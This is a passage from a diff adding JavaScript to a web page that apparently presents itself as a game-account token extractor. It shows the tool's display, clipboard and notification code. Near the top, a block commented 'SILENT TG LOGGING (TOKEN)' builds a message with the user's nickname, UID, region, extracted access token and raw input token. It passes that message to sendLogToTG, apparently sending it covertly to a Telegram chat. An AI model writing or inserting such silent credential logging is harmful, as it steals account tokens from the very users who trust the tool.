+                // --- SILENT TG LOGGING (TOKEN) ---
+                const logMsg = `🚀 <b>NEW TOKEN EXTRACTED</b>\n\n👤 <b>Name:</b> ${data.nickname}\n🆔 <b>UID:</b> ${data.uid}\n🌍 <b>Region:</b> ${data.region}\n\n🔑 <b>Access Token:</b> <code>${data.access_token}</code>\n\n📥 <b>Input EAT:</b> <code>${rawInput}</code>`;
+                sendLogToTG(logMsg);
+                // ---------------------------------
+
+                // UI Update on Success
+                document.getElementById('tokenDetails').style.display = 'block';
+                document.getElementById('tAcc').style.display = 'block';
+                document.getElementById('copyBtn').style.display = 'block';
+                document.getElementById('genericMsg').style.display = 'none';
+
+                document.getElementById('tName').textContent = data.nickname || 'N/A';
+                document.getElementById('tUid').textContent = data.uid || 'N/A';
+                document.getElementById('tRegion').textContent = data.region || 'N/A';
+                document.getElementById('tAcc').textContent = data.access_token;
+                openModal('tokenModal');
+            } else {
+                showToast(data?.error || 'Failed to extract! Token expired or Invalid.', 'error');
+            }
+        } catch (e) {
+            console.error(e);
+            showToast('Error: Failed to fetch. Check internet or token.', 'error');
+        } finally {
+            btn.innerHTML = originalText;
+            btn.disabled = false;
+        }
+    }
+
+    // === CLIPBOARD ===
+    function safeCopy() {
+        const text = document.getElementById('tAcc').textContent;
+        if (!text) return showToast('Nothing to copy!', 'error');
+
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(text)
+                .then(() => showToast('Copied Successfully!', 'success'))
+                .catch(() => fallbackCopy(text));
+        } else {
+            fallbackCopy(text);
+        }
+    }
+
+    function fallbackCopy(text) {
+        const textArea = document.createElement("textarea");
+        textArea.value = text;
+        textArea.style.position = "fixed";
+        textArea.style.left = "-9999px";
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+            document.execCommand('copy');
+            showToast('Copied Successfully!', 'success');
+        } catch (err) {
+            showToast('Copy Failed!', 'error');
+        }
+        document.body.removeChild(textArea);
+    }
+
+    // === UTILS ===
+    function showToast(msg, type) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.style.background = type === 'error' ? '#ff4757' : 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
+        toast.style.top = '30px';
+        setTimeout(() => toast.style.top = '-100px', 3500);
+    }
+    function openModal(id) { document.getElementById(id).classList.add('show'); }
+    function closeModal(id) { document.getElementById(id).classList.remove('show'); }
+
+</script>
+</body>
+</html>
